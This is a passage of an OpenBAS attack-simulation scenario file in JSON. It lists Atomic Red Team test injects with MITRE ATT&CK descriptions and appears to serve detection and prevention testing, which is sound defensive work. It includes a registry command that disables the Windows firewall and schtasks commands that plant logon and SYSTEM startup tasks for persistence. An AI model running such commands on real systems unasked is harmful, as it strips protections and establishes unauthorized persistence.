Firewall)",
          "attack_pattern_external_id" : "T1562.004",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "92c4f727-b17e-4641-825d-ac5e3bc97527",
            "phase_external_id" : "TA0005",
            "phase_stix_id" : "x-mitre-tactic--78b23412-0651-46d7-a540-170a1ce8bd5a",
            "phase_name" : "Defense Evasion",
            "phase_shortname" : "defense-evasion",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
            "phase_order" : 6
          } ]
        } ],
        "payload_cleanup_executor" : "cmd",
        "payload_cleanup_command" : "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\" /v \"EnableFirewall\" /t REG_DWORD /d 1 /f\n",
        "payload_elevation_required" : false,
        "payload_arguments" : [ ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : "afedc8c4-038c-4d82-b3e5-623a95f8a612",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:11:28.194123Z",
        "payload_updated_at" : "2025-07-03T14:44:32.236517Z",
        "command_executor" : "cmd",
        "command_content" : "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile\" /v \"EnableFirewall\" /t REG_DWORD /d 0 /f\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:11:28.211269Z",
      "injector_contract_updated_at" : "2024-12-12T08:11:28.211270Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "44f6bcb4-2c0e-498e-a7a0-9bb0858aafd9",
        "attack_pattern_name" : "Disable or Modify System Firewall",
        "attack_pattern_description" : "Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the operating system, including via command-line, editing Windows Registry keys, and Windows Control Panel.\n\nModifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed. For example, adversaries may add a new firewall rule for a well-known protocol (such as RDP) using a non-traditional and potentially less securitized port (i.e. [Non-Standard Port](https://attack.mitre.org/techniques/T1571)).(Citation: change_rdp_port_conti)\n\nAdversaries may also modify host networking settings that indirectly manipulate system firewalls, such as interface bandwidth or network connection request thresholds.(Citation: Huntress BlackCat) Settings related to enabling abuse of various [Remote Services](https://attack.mitre.org/techniques/T1021) may also indirectly modify firewall rules.\n\nIn ESXi, firewall rules may be modified directly via the esxcli command line interface (e.g., via `esxcli network firewall set`) or via the vCenter user interface.(Citation: Trellix Rnasomhouse 2024)(Citation: Broadcom ESXi Firewall)",
        "attack_pattern_external_id" : "T1562.004",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "92c4f727-b17e-4641-825d-ac5e3bc97527",
          "phase_external_id" : "TA0005",
          "phase_stix_id" : "x-mitre-tactic--78b23412-0651-46d7-a540-170a1ce8bd5a",
          "phase_name" : "Defense Evasion",
          "phase_shortname" : "defense-evasion",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to avoid being detected.\n\nDefense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or obfuscating/encrypting data and scripts. Adversaries also leverage and abuse trusted processes to hide and masquerade their malware. Other tactics’ techniques are cross-listed here when those techniques include the added benefit of subverting defenses. ",
          "phase_order" : 6
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "fbb38183-961f-493e-9554-b1629b773b00",
    "inject_title" : "Scheduled Task Startup Script",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 840,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "Scheduled Task Startup Script",
          "fr" : "Scheduled Task Startup Script"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
          "label" : "Challenges interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "scoreboard_uri",
          "label" : "Scoreboard interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "lessons_uri",
          "label" : "Lessons learned interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        } ],
        "context" : { },
        "contract_id" : "4230f0a0-b607-4ff0-8c3f-d2449a1986e7",
        "contract_attack_patterns_external_ids" : [ ],
        "is_atomic_testing" : true,
        "needs_executor" : true,
        "platforms" : [ "Windows" ]
      },
      "listened" : true,
      "injector_contract_id" : "4230f0a0-b607-4ff0-8c3f-d2449a1986e7",
      "injector_contract_labels" : {
        "en" : "Scheduled Task Startup Script",
        "fr" : "Scheduled Task Startup Script"
      },
      "injector_contract_manual" : false,
      "injector_contract_content" : "{\"config\":{\"type\":\"openbas_implant\",\"expose\":true,\"label\":{\"en\":\"OpenBAS Implant\",\"fr\":\"OpenBAS Implant\"},\"color_dark\":\"#000000\",\"color_light\":\"#000000\"},\"label\":{\"en\":\"Scheduled Task Startup Script\",\"fr\":\"Scheduled Task Startup Script\"},\"manual\":false,\"fields\":[{\"key\":\"assets\",\"label\":\"Assets\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset\"},{\"key\":\"assetgroups\",\"label\":\"Asset groups\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":[\"assets\",\"assetgroups\"],\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"type\":\"asset-group\"},{\"key\":\"obfuscator\",\"label\":\"Obfuscators\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"1\",\"defaultValue\":[\"plain-text\"],\"choices\":[{\"label\":\"plain-text\",\"value\":\"plain-text\",\"information\":\"\"},{\"label\":\"base64\",\"value\":\"base64\",\"information\":\"CMD does not support base64 obfuscation\"}],\"type\":\"choice\"},{\"key\":\"expectations\",\"label\":\"Expectations\",\"mandatory\":false,\"readOnly\":false,\"mandatoryGroups\":null,\"mandatoryConditionField\":null,\"mandatoryConditionValue\":null,\"linkedFields\":[],\"linkedValues\":[],\"cardinality\":\"n\",\"defaultValue\":[],\"predefinedExpectations\":[{\"expectation_type\":\"PREVENTION\",\"expectation_name\":\"Prevention\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"DETECTION\",\"expectation_name\":\"Detection\",\"expectation_description\":null,\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600},{\"expectation_type\":\"VULNERABILITY\",\"expectation_name\":\"Not vulnerable\",\"expectation_description\":\"\",\"expectation_score\":100.0,\"expectation_expectation_group\":false,\"expectation_expiration_time\":21600}],\"type\":\"expectation\"}],\"variables\":[{\"key\":\"user\",\"label\":\"User that will receive the injection\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[{\"key\":\"user.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.email\",\"label\":\"Email of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.firstname\",\"label\":\"First name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lastname\",\"label\":\"Last name of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"user.lang\",\"label\":\"Language of the user\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"exercise\",\"label\":\"Exercise of the current injection\",\"type\":\"Object\",\"cardinality\":\"1\",\"children\":[{\"key\":\"exercise.id\",\"label\":\"Id of the user in the platform\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.name\",\"label\":\"Name of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"exercise.description\",\"label\":\"Description of the exercise\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}]},{\"key\":\"teams\",\"label\":\"List of team name for the injection\",\"type\":\"String\",\"cardinality\":\"n\",\"children\":[]},{\"key\":\"player_uri\",\"label\":\"Player interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"challenges_uri\",\"label\":\"Challenges interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"scoreboard_uri\",\"label\":\"Scoreboard interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]},{\"key\":\"lessons_uri\",\"label\":\"Lessons learned interface platform link\",\"type\":\"String\",\"cardinality\":\"1\",\"children\":[]}],\"context\":{},\"contract_id\":\"4230f0a0-b607-4ff0-8c3f-d2449a1986e7\",\"contract_attack_patterns_external_ids\":[],\"is_atomic_testing\":true,\"needs_executor\":true,\"platforms\":[\"Windows\"]}",
      "injector_contract_custom" : false,
      "injector_contract_needs_executor" : true,
      "injector_contract_platforms" : [ "Windows" ],
      "injector_contract_payload" : {
        "listened" : true,
        "payload_id" : "1d2b7bf1-c915-4d83-8e3c-65607196cfb3",
        "payload_type" : "Command",
        "payload_name" : "Scheduled Task Startup Script",
        "payload_description" : "Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view\nthe tasks, open the Task Scheduler and look in the Active Tasks pane.\n",
        "payload_platforms" : [ "Windows" ],
        "payload_attack_patterns" : [ {
          "attack_pattern_id" : "b0b3405c-0ec9-47dd-9af4-6cfb6fbda3b4",
          "attack_pattern_name" : "Scheduled Task",
          "attack_pattern_description" : "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) ",
          "attack_pattern_external_id" : "T1053.005",
          "attack_pattern_kill_chain_phases" : [ {
            "phase_id" : "85f85b70-0513-4765-a231-c6de150aad97",
            "phase_external_id" : "TA0004",
            "phase_stix_id" : "x-mitre-tactic--5e29b093-294e-49e9-a803-dab3d73b77dd",
            "phase_name" : "Privilege Escalation",
            "phase_shortname" : "privilege-escalation",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
            "phase_order" : 5
          }, {
            "phase_id" : "8bbdf37e-90c1-4e8a-98e9-a0fd61c92930",
            "phase_external_id" : "TA0003",
            "phase_stix_id" : "x-mitre-tactic--5bc1d813-693e-4823-9961-abf9af4b0e92",
            "phase_name" : "Persistence",
            "phase_shortname" : "persistence",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
            "phase_order" : 4
          }, {
            "phase_id" : "a5cec8e9-035e-4f0b-a374-c51e782f8361",
            "phase_external_id" : "TA0002",
            "phase_stix_id" : "x-mitre-tactic--4ca45d45-df4d-4613-8980-bac22d278fa5",
            "phase_name" : "Execution",
            "phase_shortname" : "execution",
            "phase_kill_chain_name" : "mitre-attack",
            "phase_description" : "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
            "phase_order" : 3
          } ]
        } ],
        "payload_cleanup_executor" : "cmd",
        "payload_cleanup_command" : "schtasks /delete /tn \"T1053_005_OnLogon\" /f >nul 2>&1\nschtasks /delete /tn \"T1053_005_OnStartup\" /f >nul 2>&1\n",
        "payload_elevation_required" : true,
        "payload_arguments" : [ ],
        "payload_prerequisites" : [ ],
        "payload_external_id" : "fec27f65-db86-4c2d-b66c-61945aee87c2",
        "payload_source" : "COMMUNITY",
        "payload_status" : "UNVERIFIED",
        "payload_execution_arch" : "ALL_ARCHITECTURES",
        "payload_collector" : "0f2a85c1-0a3b-4405-a79c-c65398ee4a76",
        "payload_detection_remediations" : [ ],
        "payload_tags" : [ ],
        "payload_output_parsers" : [ ],
        "payload_created_at" : "2024-12-12T08:11:49.267241Z",
        "payload_updated_at" : "2025-07-03T14:47:32.742314Z",
        "command_executor" : "cmd",
        "command_content" : "schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\"\nschtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"\n",
        "payload_collector_type" : "openbas_atomic_red_team"
      },
      "injector_contract_created_at" : "2024-12-12T08:11:49.283369Z",
      "injector_contract_updated_at" : "2024-12-12T08:11:49.283369Z",
      "injector_contract_injector" : "49229430-b5b5-431f-ba5b-f36f599b0144",
      "injector_contract_attack_patterns" : [ {
        "attack_pattern_id" : "b0b3405c-0ec9-47dd-9af4-6cfb6fbda3b4",
        "attack_pattern_name" : "Scheduled Task",
        "attack_pattern_description" : "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111) utility can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) (WMI) to create a scheduled task. Adversaries may also utilize the Powershell Cmdlet `Invoke-CimMethod`, which leverages WMI class `PS_ScheduledTask` to create a scheduled task via an XML path.(Citation: Red Canary - Atomic Red Team)\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and/or to run a process under the context of a specified account (such as SYSTEM). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused the Windows Task Scheduler to potentially mask one-time execution under signed/trusted system processes.(Citation: ProofPoint Serpent)\n\nAdversaries may also create \"hidden\" scheduled tasks (i.e. [Hide Artifacts](https://attack.mitre.org/techniques/T1564)) that may not be visible to defender tools and manual queries used to enumerate tasks. Specifically, an adversary may hide a task from `schtasks /query` and the Task Scheduler by deleting the associated Security Descriptor (SD) registry value (where deletion of this value must be completed using SYSTEM permissions).(Citation: SigmaHQ)(Citation: Tarrask scheduled task) Adversaries may also employ alternate methods to hide tasks, such as altering the metadata (e.g., `Index` value) within associated registry keys.(Citation: Defending Against Scheduled Task Attacks in Windows Environments) ",
        "attack_pattern_external_id" : "T1053.005",
        "attack_pattern_kill_chain_phases" : [ {
          "phase_id" : "85f85b70-0513-4765-a231-c6de150aad97",
          "phase_external_id" : "TA0004",
          "phase_stix_id" : "x-mitre-tactic--5e29b093-294e-49e9-a803-dab3d73b77dd",
          "phase_name" : "Privilege Escalation",
          "phase_shortname" : "privilege-escalation",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to gain higher-level permissions.\n\nPrivilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. Common approaches are to take advantage of system weaknesses, misconfigurations, and vulnerabilities. Examples of elevated access include: \n\n* SYSTEM/root level\n* local administrator\n* user account with admin-like access \n* user accounts with access to specific system or perform specific function\n\nThese techniques often overlap with Persistence techniques, as OS features that let an adversary persist can execute in an elevated context.  ",
          "phase_order" : 5
        }, {
          "phase_id" : "8bbdf37e-90c1-4e8a-98e9-a0fd61c92930",
          "phase_external_id" : "TA0003",
          "phase_stix_id" : "x-mitre-tactic--5bc1d813-693e-4823-9961-abf9af4b0e92",
          "phase_name" : "Persistence",
          "phase_shortname" : "persistence",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to maintain their foothold.\n\nPersistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code. ",
          "phase_order" : 4
        }, {
          "phase_id" : "a5cec8e9-035e-4f0b-a374-c51e782f8361",
          "phase_external_id" : "TA0002",
          "phase_stix_id" : "x-mitre-tactic--4ca45d45-df4d-4613-8980-bac22d278fa5",
          "phase_name" : "Execution",
          "phase_shortname" : "execution",
          "phase_kill_chain_name" : "mitre-attack",
          "phase_description" : "The adversary is trying to run malicious code.\n\nExecution consists of techniques that result in adversary-controlled code running on a local or remote system. Techniques that run malicious code are often paired with techniques from all other tactics to achieve broader goals, like exploring a network or stealing data. For example, an adversary might use a remote access tool to run a PowerShell script that does Remote System Discovery. ",
          "phase_order" : 3
        } ]
      } ],
      "injector_contract_atomic_testing" : true,
      "injector_contract_import_available" : false,
      "injector_contract_arch" : "ALL_ARCHITECTURES",
      "injector_contract_injector_type" : "openbas_implant",
      "injector_contract_injector_type_name" : "OpenBAS Implant"
    },
    "inject_tags" : [ ],
    "inject_teams" : [ ],
    "inject_documents" : [ ]
  }, {
    "inject_id" : "2c2ed796-2433-4358-bf36-3a12b6da4103",
    "inject_title" : "`SeDebugPrivilege` token duplication",
    "inject_description" : null,
    "inject_country" : null,
    "inject_city" : null,
    "inject_enabled" : true,
    "inject_content" : {
      "expectations" : [ {
        "expectation_type" : "PREVENTION",
        "expectation_name" : "Expect inject to be prevented",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      }, {
        "expectation_type" : "DETECTION",
        "expectation_name" : "Expect inject to be detected",
        "expectation_description" : null,
        "expectation_score" : 100,
        "expectation_expectation_group" : false,
        "expectation_expiration_time" : 21600
      } ]
    },
    "inject_all_teams" : false,
    "inject_depends_on" : [ ],
    "inject_depends_duration" : 1020,
    "inject_injector_contract" : {
      "convertedContent" : {
        "config" : {
          "type" : "openbas_implant",
          "expose" : true,
          "label" : {
            "en" : "OpenBAS Implant",
            "fr" : "OpenBAS Implant"
          },
          "color_dark" : "#000000",
          "color_light" : "#000000"
        },
        "label" : {
          "en" : "`SeDebugPrivilege` token duplication",
          "fr" : "`SeDebugPrivilege` token duplication"
        },
        "manual" : false,
        "fields" : [ {
          "key" : "assets",
          "label" : "Assets",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset"
        }, {
          "key" : "assetgroups",
          "label" : "Asset groups",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : [ "assets", "assetgroups" ],
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "type" : "asset-group"
        }, {
          "key" : "obfuscator",
          "label" : "Obfuscators",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "1",
          "defaultValue" : [ "plain-text" ],
          "choices" : [ {
            "label" : "plain-text",
            "value" : "plain-text",
            "information" : ""
          }, {
            "label" : "base64",
            "value" : "base64",
            "information" : "CMD does not support base64 obfuscation"
          } ],
          "type" : "choice"
        }, {
          "key" : "expectations",
          "label" : "Expectations",
          "mandatory" : false,
          "readOnly" : false,
          "mandatoryGroups" : null,
          "mandatoryConditionField" : null,
          "mandatoryConditionValue" : null,
          "linkedFields" : [ ],
          "linkedValues" : [ ],
          "cardinality" : "n",
          "defaultValue" : [ ],
          "predefinedExpectations" : [ {
            "expectation_type" : "PREVENTION",
            "expectation_name" : "Prevention",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "DETECTION",
            "expectation_name" : "Detection",
            "expectation_description" : null,
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          }, {
            "expectation_type" : "VULNERABILITY",
            "expectation_name" : "Not vulnerable",
            "expectation_description" : "",
            "expectation_score" : 100.0,
            "expectation_expectation_group" : false,
            "expectation_expiration_time" : 21600
          } ],
          "type" : "expectation"
        } ],
        "variables" : [ {
          "key" : "user",
          "label" : "User that will receive the injection",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ {
            "key" : "user.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.email",
            "label" : "Email of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.firstname",
            "label" : "First name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lastname",
            "label" : "Last name of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "user.lang",
            "label" : "Language of the user",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "exercise",
          "label" : "Exercise of the current injection",
          "type" : "Object",
          "cardinality" : "1",
          "children" : [ {
            "key" : "exercise.id",
            "label" : "Id of the user in the platform",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.name",
            "label" : "Name of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          }, {
            "key" : "exercise.description",
            "label" : "Description of the exercise",
            "type" : "String",
            "cardinality" : "1",
            "children" : [ ]
          } ]
        }, {
          "key" : "teams",
          "label" : "List of team name for the injection",
          "type" : "String",
          "cardinality" : "n",
          "children" : [ ]
        }, {
          "key" : "player_uri",
          "label" : "Player interface platform link",
          "type" : "String",
          "cardinality" : "1",
          "children" : [ ]
        }, {
          "key" : "challenges_uri",
